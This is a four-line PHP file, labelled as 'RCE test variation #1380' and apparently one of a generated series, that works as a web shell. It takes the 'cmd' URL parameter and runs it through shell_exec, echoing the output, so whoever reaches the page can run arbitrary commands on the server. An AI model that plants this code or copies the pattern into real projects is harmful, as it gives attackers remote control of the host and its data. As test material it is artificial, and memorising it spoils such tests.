<?php
// RCE test variation #1380
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>